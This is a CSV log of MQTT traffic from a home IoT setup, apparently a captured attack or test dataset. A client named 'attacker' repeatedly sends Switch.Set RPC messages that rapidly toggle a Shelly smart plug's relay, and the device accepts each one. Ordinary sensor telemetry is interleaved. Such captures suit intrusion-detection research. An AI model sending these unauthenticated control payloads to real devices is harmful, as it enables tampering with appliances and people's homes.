2026-04-22T16:17:06,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3390 33159.310 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:06,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:06,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:06,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3391 33159.792 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:07,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:07,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33159.79,""swi"
2026-04-22T16:17:07,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3392 33159.808 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:07,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:07,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:07,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3393 33160.292 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:07,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:07,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33160.29,""swi"
2026-04-22T16:17:07,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3394 33160.312 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:07,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:07,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:07,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3395 33160.793 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:08,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:08,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33160.79,""swi"
2026-04-22T16:17:08,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3396 33160.809 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:08,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:08,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:08,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3397 33161.293 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:08,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:08,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33161.29,""swi"
2026-04-22T16:17:08,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3398 33161.312 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:08,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:08,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:08,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3399 33161.794 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:09,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:09,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33161.79,""swi"
2026-04-22T16:17:09,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3400 33161.811 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:09,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:09,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:09,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3401 33162.297 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:09,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:17:09,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:09,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:17:09,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33162.29,""swi"
2026-04-22T16:17:09,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3402 33162.316 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:09,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:09,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:09,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3403 33162.796 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:10,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:10,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33162.79,""swi"
2026-04-22T16:17:10,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3404 33162.813 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:10,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:10,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:10,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3405 33163.296 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:10,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:10,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33163.29,""swi"
2026-04-22T16:17:10,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3406 33163.315 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:10,iot/pir/binary_sensor/motion/state,2,ON
2026-04-22T16:17:10,iot/pir/debug,49,[0;36m[D][binary_sensor:048]: 'Motion' >> ON[0m
2026-04-22T16:17:10,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:10,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:10,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3407 33163.797 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:11,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:11,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33163.79,""swi"
2026-04-22T16:17:11,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3408 33163.813 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:11,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:11,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:11,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3409 33164.297 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:11,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:11,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33164.29,""swi"
2026-04-22T16:17:11,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3410 33164.316 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:11,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:11,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:11,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3411 33164.798 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:12,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:12,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33164.80,""swi"
2026-04-22T16:17:12,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3412 33164.815 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:12,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:12,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:12,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3413 33165.300 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:12,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:12,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33165.30,""swi"
2026-04-22T16:17:12,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3414 33165.319 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:12,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:12,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:12,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3415 33165.799 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:13,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:13,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33165.80,""swi"
2026-04-22T16:17:13,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3416 33165.816 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:13,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:13,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:13,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3417 33166.300 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:13,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:13,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33166.30,""swi"
2026-04-22T16:17:13,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3418 33166.318 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:13,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:13,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:13,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3419 33166.803 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:14,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:14,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33166.80,""swi"
2026-04-22T16:17:14,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3420 33166.819 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:14,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:14,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:14,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3421 33167.303 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:14,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:17:14,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:17:14,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:14,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33167.30,""swi"
2026-04-22T16:17:14,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3422 33167.321 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:14,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:14,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:14,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3423 33167.801 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:15,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:15,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33167.80,""swi"
2026-04-22T16:17:15,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3424 33167.818 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:15,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:15,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:15,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3425 33168.302 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:15,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:15,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33168.30,""swi"
2026-04-22T16:17:15,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3426 33168.320 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:15,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:15,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:15,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3427 33168.802 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:16,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:16,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33168.80,""swi"
2026-04-22T16:17:16,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3428 33168.818 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:16,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:17:16,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:17:16,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:17:16,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:17:16,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:17:16,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:16,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:16,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3429 33169.304 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:16,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:16,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33169.30,""swi"
2026-04-22T16:17:16,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3430 33169.322 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:16,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:16,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:16,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3431 33169.803 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:17,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:17,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33169.80,""swi"
2026-04-22T16:17:17,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3432 33169.820 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:17,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:17,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:17,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3433 33170.303 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:17,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:17,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33170.30,""swi"
2026-04-22T16:17:17,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3434 33170.322 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:17,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:17,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:17,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3435 33170.804 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:18,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:18,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33170.80,""swi"
2026-04-22T16:17:18,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3436 33170.820 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:18,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:18,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:18,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3437 33171.307 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:18,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:18,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33171.30,""swi"
2026-04-22T16:17:18,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3438 33171.326 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:18,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:18,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:18,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3439 33171.805 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:19,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:19,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33171.80,""swi"
2026-04-22T16:17:19,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3440 33171.821 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:19,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:19,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:19,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3441 33172.306 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:19,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:17:19,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
